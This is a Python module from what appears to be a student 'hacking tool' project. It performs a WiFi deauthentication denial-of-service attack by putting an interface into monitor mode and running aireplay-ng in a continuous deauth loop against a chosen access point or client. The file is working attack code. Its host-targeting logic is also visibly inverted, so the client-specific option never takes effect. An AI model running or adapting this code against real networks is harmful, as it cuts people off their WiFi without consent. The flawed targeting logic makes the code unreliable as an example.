'''
============================================================
                NSSECU2 - Hacking Tool Project
============================================================
        Members: Escalona, Fadrigo, Fortiz, Manzano, Sy
        Topic: WiFi Hacking Tool
        Description: The objective of this project is to 
                     create a packaged tool that will be 
                     able to do Wi-Fi scanning, cracking, 
                     and admin control access.
        Objective Functionalities:
            1. WiFi Scanning & Handshake Capture
            2. WiFi Cracking
            3. WAP/Router Admin Control Access
            4. WiFi DOS
            5. Windows Saved WiFi Passwords
============================================================

DEAUTHENTICATION MODULE
'''

import interfaces.interfaces as interface
import scanning.wifi.wpascan as wpascan
import utils.utils as utils
import subprocess

def wifi_dos(device):
    utils.header("WiFi DOS (Deauth) Attack","Configure WiFi Deauth Parameters")
    target = wpascan.get_target(device)

    if target == None:
        return

    target_host = ""

    invalid_mac = True
    if utils.yesNo("WiFi DOS (Deauth) Attack","Configure WiFi Deauth Parameters","Enable Host Specific Mode?", False):
        while invalid_mac:
            utils.header("WiFi DOS (Deauth) Attack", "Host Specific Mode Configuration")
            target_host = input("Enter MAC address of target device (Fformat: AA:BB:CC:DD:EE:FF): ").upper()
            if utils.valid_mac(target_host):
                invalid_mac = False
        utils.header("WiFi DOS (Deauth) Attack", "Note that configuration is set to Host Specific Mode mode and will target " + target_host.upper() + ".")
    else:
        utils.header("WiFi DOS (Deauth) Attack", "Note that configuration for WiFi Deauth Attack will be noisy.")

    utils.getch()
    target_descs = [
                "Death Attack Target",
                "SSID: " + target["essid"],
                "MAC Address: " + target["bssid"],
                "Channel: " + target["channel"],
                "Host Specific Mode: " + str(not(target_host == "")),
                "Target Host: " + target_host
            ]
    if utils.yesNo("WiFi DOS (Deauth) Attack", target_descs, "Start Deauth Attack?", False):
        utils.header("WiFi DOS (Deauth) Attack", "Deauth Attack Starting...")
        process = deauth_wifi(target, device, target_host, target_host == "")
        if process.poll() is None:
            utils.header("WiFi DOS (Deauth) Attack", "Deauth Attack Ongoing...")
            utils.getch("Press enter to end WiFi Deauth Attack...")
            process.kill()
    else:
        utils.header("WiFi DOS (Deauth) Attack", "Deauth Attack Cancelled!")

def deauth_wifi(wifi:dict, device, host_macaddress:"", host_mode=False):
    wifi_macaddress = wifi["bssid"]
    device_logicalname = interface.get_logicalname(device)

    utils.header("Loading WiFi DOS attack...", "Activating Airmon-ng...")
    interface.terminate_services()
    interface.enable_mon(device, channel=wifi["channel"])

    utils.header("Loading WiFi DOS attack...", ["Airmon-ng active!","Loading deauth attack..."])

    command = "aireplay-ng -0 0 -a " + wifi_macaddress + " " + device_logicalname
    loading_dos = "Loading WiFi DOS attack..."
    host_err = ["Airmon-ng active!","Host Specific Mode Configuration Error"]
    if host_mode and host_macaddress != "":
        utils.header(loading_dos, host_err)
        if utils.yesNo(loading_dos, host_err,"Do you want to continue in non-host specific mode?", True):
            command = "aireplay-ng -0 0 -a " + wifi_macaddress + " -c " + host_macaddress + " " + device_logicalname
        else:
            return None

    return subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

def stop_deauth(process:subprocess):
    process.kill()